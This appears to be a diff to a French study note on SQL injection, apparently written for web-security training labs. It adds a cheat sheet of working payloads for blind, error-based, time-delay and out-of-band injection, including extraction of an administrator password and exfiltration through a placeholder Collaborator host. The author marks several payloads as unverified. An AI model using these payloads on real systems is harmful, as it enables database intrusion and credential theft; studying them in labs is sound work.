@@ -134,4 +134,18 @@ statut: en cours
 - Colonnes, Oracle : `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--` (noms en majuscules)
 - Catégorie inexistante dans le filtre - isole la ligne injectée du reste des résultats
 - Le point d'injection peut aussi être dans le corps de la requête, un cookie ou un en-tête
-- Détail : [[SQL-injection]], [[SQL-injection-Union-Attacks]]
+- Injection aveugle, détection booléenne : `x' AND '1'='1` (message présent) puis `x' AND '1'='2` (message absent) ; numérique : `x AND 1=1` puis `x AND 1=2`
+- Aveugle, existence d'une table ou d'un utilisateur : `xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` puis `xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+- Aveugle, longueur du mot de passe : `xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` (incrémenter jusqu'à la disparition du signal ; `LEN` sur Microsoft)
+- Aveugle, extraction d'un caractère (Intruder, position sur le dernier `a`, Grep - Match sur le message) : `xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§` ; `SUBSTR` sur Oracle
+- Aveugle, dichotomie sur le code du caractère : `xyz' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--` (insensible au piège de la casse)
+- Erreur conditionnelle, Oracle : `' || (SELECT CASE WHEN (cond) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '`
+- Erreur conditionnelle, Microsoft : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/0 ELSE 1 END)--`
+- Erreur conditionnelle, PostgreSQL : `' AND 1=(SELECT CASE WHEN (cond) THEN 1/(SELECT 0) ELSE 1 END)--`
+- Erreur verbeuse, PostgreSQL : `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` (vider la valeur d'origine du cookie si le message est tronqué)
+- Délai simple (10 secondes) : Oracle `'||dbms_pipe.receive_message(('a'),10)--`, Microsoft `'; WAITFOR DELAY '0:0:10'--`, PostgreSQL `'||pg_sleep(10)--`, MySQL `' AND SLEEP(10)-- -`
+- Délai conditionnel : Oracle `' || (SELECT CASE WHEN (cond) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)--`, Microsoft `'; IF (cond) WAITFOR DELAY '0:0:10'--`, PostgreSQL `'%3BSELECT CASE WHEN (cond) THEN pg_sleep(10) ELSE pg_sleep(0) END--` (`;` encodé dans un cookie), MySQL `' AND IF(cond,SLEEP(10),0)-- -`
+- Hors bande : Microsoft `'; exec master..xp_dirtree '//COLLAB/a'--`, PostgreSQL `'; copy (SELECT '') to program 'nslookup COLLAB'--` (privilèges élevés), Oracle `UTL_INADDR.get_host_address('COLLAB')` (privilèges élevés) ; `COLLAB` = sous-domaine Burp Collaborator ; exfiltration en plaçant la sous-requête dans le sous-domaine
+- Burp Intruder : délais, Resource pool à une requête simultanée ; deux positions (index et caractère), Cluster bomb
+- Non rejoués sur une base : les payloads d'erreur, de délai et hors bande sont à vérifier sur les labs correspondants avant de s'y fier
+- Détail : [[SQL-injection]], [[SQL-injection-Union-Attacks]], [[Blind-SQL-injection]]
